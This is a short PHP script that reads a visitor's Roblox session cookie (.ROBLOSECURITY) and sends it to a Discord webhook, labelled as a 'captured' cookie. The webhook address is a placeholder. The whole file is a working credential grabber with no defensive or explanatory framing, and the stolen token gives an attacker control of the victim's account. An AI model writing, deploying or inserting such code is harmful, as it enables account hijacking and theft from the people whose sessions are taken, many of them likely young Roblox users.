<?php
$webhookUrl = 'https://discord.com/api/webhooks/your-webhook-id/your-webhook-token';

if (isset($_COOKIE['.ROBLOSECURITY'])) {
    $cookie = $_COOKIE['.ROBLOSECURITY'];
    $data = array('content' => 'Captured .ROBLOSECURITY cookie: ' . $cookie);
    $options = array(
        'http' => array(
            'method'  => 'POST',
            'content' => json_encode($data),
            'header'  => "Content-Type: application/json\r\n"
        )
    );
    $context  = stream_context_create($options);
    $result = file_get_contents($webhookUrl, false, $context);
    if ($result === FALSE) {
        die('Error');
    }
}
?>
